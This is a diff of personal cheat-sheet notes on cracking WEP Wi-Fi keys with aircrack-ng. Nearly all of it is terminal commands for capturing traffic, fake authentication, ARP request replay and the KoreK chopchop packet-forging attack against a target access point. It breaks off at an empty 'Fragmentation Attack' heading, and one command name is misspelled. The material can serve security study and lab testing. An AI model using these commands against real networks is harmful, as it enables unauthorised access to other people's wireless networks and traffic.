@@ -6,5 +6,62 @@
 #iwconfig
 #airodump-ng [MonitorModeInterface]   // get WEP AP from the output
 #airodump-ng --bssid <BSSID> --channel <CHANNEL> --write <fileName> [MonitorModeInterface]
+
 ** while keeping the above capturing running, go to the directory where fileName.cap is saved and run below command to crack the key
-#aircrack-ng fileName.cap     // in the outout check for KEY FOUND!
+#aircrack-ng fileName.cap     // in the output check for KEY FOUND!
+
+========================= Above attack works if the network is busy and we can capture enough packets to crack it ================
+
+Problem: 
+------------
+  -  If the network is not busy or no client is associated with the AP
+  -  It would take some time to capture enough IVs.
+
+Solution:
+------------
+  -  Force the AP to generate new IVs [FAKE AUTHENTICATION ATTACK]
+
+
+FAKE AUTHENTICATION ATTACK
+---------------------------------------------------
+1. Associate with the AP before launching the attack. [ because by default AP ignore any requests they get from any device, unless the device is
+connected to this network or associated with it.]
+
+TERM1 => #airodump-ng --bssid <BSSID> --channel [CHANNEL] --write [FileName_test] [MonitorModeInterface]   // keep running this and on another terminal try below command.
+TERM2 => #aireplay-ng --fakeauth 0 -a [target_AP_mac] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)]  [MonitorModeInterface]
+
+2.1 Once Associated with AP, we can inject the packets to force the access points to generate new packets with new IVs for thsis
+we are going to perform ARP Request Reply 
+        {
+          1. wait for an ARP packet. 
+          2. Capture it, and replay it. This causes the AP to produce another packet with a new IV. 
+          3. Keep doing it till we have enough IVs to crack the key.
+        }
+
+TERM3 =>aireplay-ng --arpreplay -b [target_AP_mac_BSSID] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)] [MonitorModeInterface]
+TERM2 => #aireplay-ng --fakeauth 0 -a [target_AP_mac_BSSIDc] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)]  [MonitorModeInterface]
+TERM4 => #aircrack-ng [FileName_test.cap]
+
+
+OR
+
+2.2 Another method to inject packets to increase the data is KOREK Chop Chop Attack. But it's more complex than ARP Request Replay
+        {
+          1. Determine packet key stream. 
+          2. Forge a new packet. 
+          3. Inject it in the traffic.
+        }
+
+TERM3 => #aireplay-ng --chopchop -b [target_AP_mac_BSSID] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)]  [MonitorModeInterface]  // will get  command_check_output_replay_dec.xor
+TERM3 => #packetforge-ng -0 -a [target_AP_mac_BSSID] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)] -k [DESTINATION_IP_255.255.255.255] -l [SOURCE_IP_255.255.255.255] -y [file saved from above command_check_output_replay_dec.xor] [filename_chopchop-forged-packet]
+TERM2 => #aireplay-ng --fakeauth 0 -a [target_AP_mac_BSSIDc] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)]  [MonitorModeInterface]
+TERM3 => #aireply-ng -2 -r [filename_chopchop-forged-packet] [MonitorModeInterface] //keep this Running
+TERM4 => #aircrack-ng [FileName_test.cap]     // data reach aroun 20,000
+
+
+
+OR
+
+2.3 Fragmentation Attack
+
+
